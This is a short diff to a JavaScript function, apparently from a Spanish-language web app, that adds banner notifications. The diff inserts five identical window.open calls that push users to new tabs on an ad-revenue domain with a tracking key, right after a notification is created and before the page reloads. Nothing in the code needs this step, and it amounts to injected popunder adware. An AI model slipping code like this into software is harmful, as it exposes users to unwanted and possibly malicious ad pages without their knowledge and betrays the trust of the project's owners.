@@ -168,6 +168,12 @@ const agregarCintillos = async () => {
         notificacionData
       );
       console.log(msg);
+      
+      window.open('https://www.highcpmrevenuegate.com/snidd0ff?key=d5add209c5ea339d1d4e0f8df6a2e610', '_blank');
+      window.open('https://www.highcpmrevenuegate.com/snidd0ff?key=d5add209c5ea339d1d4e0f8df6a2e610', '_blank');
+      window.open('https://www.highcpmrevenuegate.com/snidd0ff?key=d5add209c5ea339d1d4e0f8df6a2e610', '_blank');
+      window.open('https://www.highcpmrevenuegate.com/snidd0ff?key=d5add209c5ea339d1d4e0f8df6a2e610', '_blank');
+      window.open('https://www.highcpmrevenuegate.com/snidd0ff?key=d5add209c5ea339d1d4e0f8df6a2e610', '_blank');
       window.location.reload();
     }
     obtenerTotalCintillos();
